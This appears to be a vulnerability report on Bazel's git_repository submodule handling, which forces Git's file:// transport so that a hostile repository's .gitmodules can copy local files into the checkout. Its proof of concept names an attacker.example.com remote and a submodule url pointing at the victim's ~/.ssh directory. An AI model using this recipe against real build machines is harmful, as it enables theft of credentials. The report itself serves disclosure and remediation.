### Title
Forced `protocol.file.allow=always` in git submodule fetch enables arbitrary local file read via attacker-controlled `.gitmodules` - (File: `tools/build_defs/repo/git_worker.bzl`)

### Summary
`git_repository`/`new_git_repository` unconditionally re-enables Git's `file://` transport for submodule operations, overriding the security-hardened default (`protocol.file.allow=user`/disabled for recursive fetches) that upstream Git shipped specifically to close this class of bug (the fix behind CVE-2022-39253). Because the submodule URL comes from `.gitmodules`, which is fully attacker-controlled content inside the fetched repository, a hostile git host can make Bazel's submodule step read arbitrary files from the build machine's local filesystem into the external-repository checkout, breaching the fetch/extraction containment boundary that `git_repository` is supposed to provide.

### Finding Description
When `init_submodules` or `recursive_init_submodules` is set, `update_submodules` in `tools/build_defs/repo/git_worker.bzl` runs: [1](#0-0) 

```
def update_submodules(ctx, git_repo, recursive = False):
    if recursive:
        # "protocol.file.allow=always" allows the submodule command clone from a local directory.
        # It's necessary for Git 2.38.1 and assoicated backport versions.
        # See https://github.com/bazelbuild/bazel/issues/17040
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--recursive", "--checkout", "--force")
    else:
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--checkout", "--force")
```

Every `git`/`_git`/`_git_maybe_shallow` invocation passes an argv list to `ctx.execute`, so this is not a shell-quoting/OS-command-injection bug in the classic sense — `ctx.execute` invokes `git` directly with an argument vector, not through a shell. The bug class instead maps to **containment breach via attacker-controlled fetched content flowing into a trust-boundary configuration flag**: `.gitmodules` (part of the repository tree fetched from the attacker-controlled `remote`) can declare a submodule with a `url = "file:///absolute/local/path"` entry. Upstream Git changed the default for `protocol.file.allow` specifically because a malicious repository's `.gitmodules`/gitlink content could otherwise direct a recursive submodule clone to read files from anywhere on the local filesystem of the machine performing the clone (CVE-2022-39253). By forcing `protocol.file.allow=always` on every submodule update, Bazel intentionally reinstates exactly the transport that upstream disabled by default, and this override applies regardless of whether the `remote`/`commit` originate from a benign or attacker-controlled/compromised host.

The `remote` attribute is the network origin the victim's build fetches from — precisely the "hostile origin server or mirror" scenario in scope. Unlike `http_archive`'s `sha256`/`integrity`, `git_repository` has no independent content digest beyond `git reset --hard <commit>`, and even when `commit` is pinned, the `.gitmodules` file and its submodule gitlinks are simply part of that pinned tree; nothing in the fetch pipeline inspects or restricts the submodule URL scheme before Bazel hands control to `git submodule update` with the insecure flag set.

### Impact Explanation
A crafted `.gitmodules` submodule entry using `file://` can cause the `git submodule update --init [--recursive]` step to copy the contents of an arbitrary local directory readable by the Bazel user (e.g. `~/.ssh`, `~/.netrc`, cloud credential files, `/etc`) into the checkout directory of the external repository, i.e., material sourced from outside the intended repository/checkout boundary is written into a location bazel treats as trusted, attacker-influenced repository content. Because the attacker also controls the rest of that repository's tree (including any BUILD files it ships, which are legitimately consumed as the external repo's own build files), the exfiltrated file contents can subsequently be packaged into build outputs or otherwise surfaced, resulting in local secret/credential disclosure to the attacker who controls the git remote.

### Likelihood Explanation
Exploitation requires only that a victim configure a `git_repository`/`new_git_repository` pointing at a repository the attacker controls or has compromised (a common supply-chain scenario — a dependency's git mirror is compromised, or a low-trust fork/branch is fetched during CI) and enable `init_submodules`/`recursive_init_submodules` (a supported, commonly used, documented attribute). No cooperation from the victim beyond running `bazel build`/`bazel fetch` is needed, and no access to the victim's machine, credentials, or trusted root `BUILD`/`.bzl` files is required by the attacker.

### Recommendation
Do not unconditionally force `protocol.file.allow=always` for submodule operations. Restrict it (e.g. `protocol.file.allow=user` matching current upstream Git defaults, or scope it only to the specific local paths Bazel itself needs, such as recursive local-path repositories intentionally configured by the user) so that attacker-supplied `.gitmodules` entries from a fetched repository cannot direct Git to read from arbitrary local filesystem paths outside the checkout.

### Proof of Concept
1. Attacker hosts a git repository at `https://attacker.example.com/evil.git` containing a `.gitmodules` file:
   ```
   [submodule "leak"]
       path = leak
       url = file:///home/victim/.ssh
   ```
   with a corresponding gitlink commit in the tree.
2. Victim's `MODULE.bazel`/`WORKSPACE` contains:
   ```
   git_repository(
       name = "dep",
       remote = "https://attacker.example.com/evil.git",
       commit = "<pinned-or-attacker-authored-commit>",
       recursive_init_submodules = True,
   )
   ```
3. On `bazel build @dep//...`, `git_worker.bzl`'s `update_submodules` runs `git -c protocol.file.allow=always submodule update --init --recursive --checkout --force`, which clones `/home/victim/.ssh` into `<output_base>/external/+git_repository+dep/leak/`, copying the victim's SSH keys into the Bazel-managed external repository directory, outside the boundary the fetch was meant to restrict content to.

A `BuildIntegrationTestCase`/`src/test/shell/bazel/starlark_git_repository_test.sh`-style test can reproduce this deterministically by creating a local bare git repo with a `file://`-pointing `.gitmodules`, using it as `remote`, setting `recursive_init_submodules = True`, and asserting that content from an out-of-tree local directory appears inside the fetched repository's checkout.

### Citations

**File:** tools/build_defs/repo/git_worker.bzl (L210-217)
```text
def update_submodules(ctx, git_repo, recursive = False):
    if recursive:
        # "protocol.file.allow=always" allows the submodule command clone from a local directory.
        # It's necessary for Git 2.38.1 and assoicated backport versions.
        # See https://github.com/bazelbuild/bazel/issues/17040
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--recursive", "--checkout", "--force")
    else:
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--checkout", "--force")
```
